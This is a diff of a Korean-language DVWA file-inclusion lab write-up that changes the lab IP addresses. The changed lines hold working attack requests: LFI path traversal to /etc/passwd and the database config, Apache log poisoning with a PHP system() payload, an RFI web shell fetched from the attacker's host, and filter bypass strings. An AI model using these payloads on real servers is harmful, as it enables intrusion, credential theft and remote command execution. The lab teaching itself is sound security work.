@@ -21,8 +21,8 @@ mermaid: true
 
 | 구분 | 내용 |
 |---|---|
-| 공격자 | Kali Linux (192.168.0.10) |
-| 대상 서버 | Ubuntu + DVWA (192.168.0.30/DVWA/) |
+| 공격자 | Kali Linux (192.168.56.10) |
+| 대상 서버 | Ubuntu + DVWA (192.168.56.30/DVWA/) |
 | 도구 | Firefox, curl, python3 |
 
 ---
@@ -184,8 +184,8 @@ if (in_array($_GET['page'], $allowed)) {
 
 ```mermaid
 flowchart LR
-    A["공격자 서버</br>192.168.0.10"] -->|"shell.txt 호스팅"| B["http://192.168.0.10/shell.txt"]
-    C[공격자 브라우저] -->|"?page=http://192.168.0.10/shell.txt&cmd=id"| D["피해자 서버</br>192.168.0.30"]
+    A["공격자 서버</br>192.168.56.10"] -->|"shell.txt 호스팅"| B["http://192.168.56.10/shell.txt"]
+    C[공격자 브라우저] -->|"?page=http://192.168.56.10/shell.txt&cmd=id"| D["피해자 서버</br>192.168.56.30"]
     D -->|"shell.txt 다운로드 후 실행"| B
     D -->|"id 명령 결과 반환"| C
 ```
@@ -267,7 +267,7 @@ PHP 5.3.4 이전 버전에서 유효합니다. Null 바이트 이후의 문자�
 
 | 레벨 | 서버 측 방어 | 공격(우회) 방안 | 방어 한계 |
 |---|---|---|---|
-| **Low** | 없음 | `?page=../../../../etc/passwd`, `?page=http://192.168.0.10/shell.txt`(RFI) | 검증 자체가 없음 |
+| **Low** | 없음 | `?page=../../../../etc/passwd`, `?page=http://192.168.56.10/shell.txt`(RFI) | 검증 자체가 없음 |
 | **Medium** | `http://`,`https://`,`../`,`..\` 문자열을 `str_replace`로 1회 제거 | 중첩 삽입 `hthttp://tp://`, `....//....//` (제거 후 원형 복원) | 1회 치환이라 중첩으로 복원됨 |
 | **High** | `fnmatch()`로 파일명이 **`file*`로 시작**해야 통과 | `file:///etc/passwd` 처럼 `file` 프로토콜 접두사로 화이트리스트 통과 | 접두사 패턴만 검사 |
 | **Impossible** | **허용 파일명 화이트리스트**(`include.php`,`file1.php`…)만 허용 | 목록 외 파일은 모두 거부 → 불가 | — (근본 방어) |
@@ -283,7 +283,7 @@ PHP 5.3.4 이전 버전에서 유효합니다. Null 바이트 이후의 문자�
 기본 URL 구조를 확인합니다.
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=include.php
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=include.php
 ```
 
 `page` 파라미터가 파일명을 받습니다.
@@ -291,7 +291,7 @@ http://192.168.0.30/DVWA/vulnerabilities/fi/?page=include.php
 **Step 1. `/etc/passwd` 읽기**
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=../../../etc/passwd
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=../../../etc/passwd
 ```
 
 출력 예시:
@@ -305,7 +305,7 @@ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 **Step 2. `/etc/hosts` 읽기**
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=../../../etc/hosts
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=../../../etc/hosts
 ```
 
 내부 네트워크 구성 및 도메인 매핑 정보를 확인할 수 있습니다.
@@ -313,13 +313,13 @@ http://192.168.0.30/DVWA/vulnerabilities/fi/?page=../../../etc/hosts
 **Step 3. 커널 버전 확인**
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=../../../proc/version
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=../../../proc/version
 ```
 
 **Step 4. DVWA DB 설정 파일 탈취**
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=../../config/config.inc.php
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=../../config/config.inc.php
 ```
 
 DB 호스트, 사용자명, 비밀번호가 그대로 노출됩니다.
@@ -347,19 +347,19 @@ flowchart LR
 
 ```bash
 curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
-     http://192.168.0.30/DVWA/
+     http://192.168.56.30/DVWA/
 ```
 
 Apache 로그 파일에는 다음과 같이 기록됩니다.
 
 ```
-192.168.0.10 - - [01/Jun/2026:18:00:00 +0900] "GET /DVWA/ HTTP/1.1" 200 1234 "-" "<?php system($_GET['cmd']); ?>"
+192.168.56.10 - - [01/Jun/2026:18:00:00 +0900] "GET /DVWA/ HTTP/1.1" 200 1234 "-" "<?php system($_GET['cmd']); ?>"
 ```
 
 **2단계: LFI로 로그 파일 인클루드하면서 명령 실행**
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=../../../var/log/apache2/access.log&cmd=id
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=../../../var/log/apache2/access.log&cmd=id
 ```
 
 출력 예시:
@@ -387,7 +387,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 **Kali에서 악성 PHP 파일 준비 및 서버 실행**
 
 ```bash
-# Kali(192.168.0.10)에서 작업
+# Kali(192.168.56.10)에서 작업
 
 # 악성 파일 생성 (PHP 코드를 .txt 확장자로 저장)
 echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.txt
@@ -405,22 +405,22 @@ cd /tmp && python3 -m http.server 80
 
 ```
 # 기본 실행 테스트
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=http://192.168.0.10/shell.txt&cmd=id
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=http://192.168.56.10/shell.txt&cmd=id
 
 # 시스템 정보 수집
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=http://192.168.0.10/shell.txt&cmd=uname+-a
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=http://192.168.56.10/shell.txt&cmd=uname+-a
 
 # 사용자 계정 확인
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=http://192.168.0.10/shell.txt&cmd=cat+/etc/passwd
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=http://192.168.56.10/shell.txt&cmd=cat+/etc/passwd
 
 # 현재 디렉토리 파일 목록
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=http://192.168.0.10/shell.txt&cmd=ls+-la
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=http://192.168.56.10/shell.txt&cmd=ls+-la
 ```
 
 Kali의 HTTP 서버 터미널에서 피해자 서버가 파일을 요청하는 로그를 확인할 수 있습니다.
 
 ```
-192.168.0.30 - - [01/Jun/2026 18:05:23] "GET /shell.txt HTTP/1.0" 200 -
+192.168.56.30 - - [01/Jun/2026 18:05:23] "GET /shell.txt HTTP/1.0" 200 -
 ```
 
 > RFI는 피해자 서버가 공격자 서버에 능동적으로 접속해 악성 파일을 실행합니다.  
@@ -447,14 +447,14 @@ $file = str_replace(array("../", "..\""), "", $_GET['page']);
 
 ```
 # 원본 입력
-hthttp://tp://192.168.0.10/shell.txt
+hthttp://tp://192.168.56.10/shell.txt
 
 # 필터 처리 후 (http:// 제거)
-http://192.168.0.10/shell.txt  ← 의도한 결과
+http://192.168.56.10/shell.txt  ← 의도한 결과
 ```
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=hthttp://tp://192.168.0.10/shell.txt&cmd=id
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=hthttp://tp://192.168.56.10/shell.txt&cmd=id
 ```
 
 ### 6.2 LFI 우회 — 경로 중복 삽입
@@ -470,7 +470,7 @@ http://192.168.0.30/DVWA/vulnerabilities/fi/?page=hthttp://tp://192.168.0.10/she
 ```
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=....//....//....//etc/passwd
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=....//....//....//etc/passwd
 ```
 
 ---
@@ -481,7 +481,7 @@ High 레벨은 `fnmatch("file*", $file)` 로 **파일명이 `file` 로 시작**�
 `../` 나 `http://` 차단을 노린 것이지만, **`file://` 프로토콜 접두사**가 `file` 로 시작하므로 통과합니다.
 
 ```
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
 ```
 
 > High의 교훈: "특정 접두사로 시작" 같은 **패턴 화이트리스트**는 의도치 않은 값(`file://`)을 허용할 수 있습니다.
